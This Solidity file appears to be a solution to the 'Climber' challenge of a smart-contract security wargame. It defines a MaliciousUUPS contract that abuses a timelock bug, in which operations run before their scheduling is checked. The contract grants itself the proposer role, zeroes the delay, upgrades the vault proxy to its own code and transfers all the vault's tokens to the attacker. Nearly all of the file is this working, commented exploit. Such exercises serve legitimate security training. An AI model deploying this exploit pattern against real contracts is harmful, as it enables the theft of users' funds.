// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../climber/ClimberTimelock.sol";


// This contract has two purpose:
//   1) launch the attack in one transaction 
//   2) serves as an upgraded version for UUPS
// Therefore, there will be two deployment of this contract
//   1) attacker's copy for hacking
//   2) proxy's deployment 

contract MaliciousUUPS is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    
    ClimberTimelock timelock;
    address vaultAddress;
    address private attacker; 
    constructor() initializer {
        attacker = msg.sender;
    }
    
    // Goal: make the proxy owning this function ;)
    function giveaway(address tokenAddress, 
                      address recipient) external {
        IERC20 token = IERC20(tokenAddress);
        token.transfer(recipient, token.balanceOf(address(this)));
    }  

    function attack(address tokenAddress,
                    ClimberTimelock _timelock,
                    address _vaultAddress) public {
        
        timelock = _timelock;
        vaultAddress = _vaultAddress;

        // exploit timelock's bug: using execute to schedule
        cancelDelayAndScheduleAttack();
        
        // force the proxy upgrade to this
        executeAttack();

        // The proxy now has the giveaway() function, we can take them all.
        MaliciousUUPS(vaultAddress).giveaway(tokenAddress, 
                                             msg.sender);
    }
    
    // This function timelock.execute() 4 operations:
    //    1) grant proposer roles
    //    2) update delay to 0
    //    3) timelock.schedule("vault.upgradeTo(MaliciousUUPS)")
    //    4) timelock.schedule(["1)", "2)", "3)", "4)"]);
    // NOTES: note that operation 4 cannot be done by calling 
    //        timelock.schedule 'directly', because the encoding
    //        of itself is its argument. That is, 
    //        
    //            timelock.schedule(..., encode(..., timelock.schdule( timelock.schedule(...))))
    //
    //        Therefore, we have to exclude the encoding from
    //        the arguments by calling schedule() FROM OTHER CONTEXT. 
    //        the calling context is no longer the timelock but 
    //        the attack contract (this). To make this work, 
    //        the proposer role should be the attacker contract (this)
    //        instead of the timelock. Hence, 1) and 3) should be
    //        performed under the proposer change.
    function cancelDelayAndScheduleAttack() internal {
        // targets are all timelocks
        address[] memory targets;
        uint256[] memory values;
        bytes[] memory dataElements;
        (targets, values, dataElements) = getHackyScheduleOperationListParams();
        timelock.execute(targets,
                         values,
                         dataElements,
                         "");
    }
    
    // timelock.schedule() wrapper to schedule the list of operations itself
    function scheduleSelf() external {
        // targets are all timelocks
        address[] memory targets;
        uint256[] memory values;
        bytes[] memory dataElements;
        (targets, values, dataElements) = getHackyScheduleOperationListParams();

        timelock.schedule(targets,
                          values,
                          dataElements,
                          "");
    }
    

    // See cancelDeleyAndScheduleAttack() 
    function getHackyScheduleOperationListParams() internal view 
              returns (address[] memory, uint256[] memory, bytes[] memory) {
        // targets are all timelocks
        address[] memory targets = new address[](4);
        targets[0] = address(timelock); 
        targets[1] = address(timelock); 
        targets[2] = address(this); 
        targets[3] = address(this);
        
        // values are all zero
        uint256[] memory values = new uint256[](4);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;

        // functioncalls:
        // 1) grantRole(timelock, PROPOSER_ROLE)
        bytes[] memory dataElements = new bytes[](4);
        bytes memory grantRole = abi.encodeWithSignature(
            "grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), 
            address(this)
        );
        dataElements[0] = grantRole;

        // 2) updateDelay(uint64)
        bytes memory cancelDelay = abi.encodeWithSignature(
            "updateDelay(uint64)", 0 days);
         
        dataElements[1] = cancelDelay;
        
        // 3) schedule([timelock],[0], [upgradeTo(..)])
        dataElements[2] = abi.encodeWithSignature("scheduleAttack()");

        // 4) schedule itself to pass the check
        dataElements[3] = abi.encodeWithSignature("scheduleSelf()");
        return (targets, values, dataElements);
    }


    function getAttackOperationParams() internal view
            returns (address[] memory, uint256[] memory, bytes[] memory) {
        // Goal: call upgradeTo(address)
        address[] memory targets = new address[](1);
        targets[0] = vaultAddress;
        uint256[] memory values = new uint256[](1);
        values[0] = 0;
        bytes[] memory dataElements = new bytes[](1); 
        bytes memory upgradeCall = abi.encodeWithSignature(
            "upgradeTo(address)", address(this)
        );
        dataElements[0] = upgradeCall;
        return (targets, values, dataElements);
    }

    // timelock.schedule() wrapper for making proxy upgrade
    // paired with executeAttack()
    function scheduleAttack() external {
        address[] memory targets;
        uint256[] memory values;
        bytes[] memory dataElements;
        (targets, values, dataElements) = getAttackOperationParams();
        timelock.schedule(targets,
                          values,
                          dataElements,
                          "");
    }

    // Perform UUPS upgrade for proxy
    // by calling upgradeTo()
    function executeAttack() internal {
        address[] memory targets;
        uint256[] memory values;
        bytes[] memory dataElements;
        (targets, values, dataElements) = getAttackOperationParams();
        timelock.execute(targets,
                         values,
                         dataElements,
                         "");
    }
    

    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
    function _authorizeUpgrade(address newImplementation) internal onlyOwner override {}
}
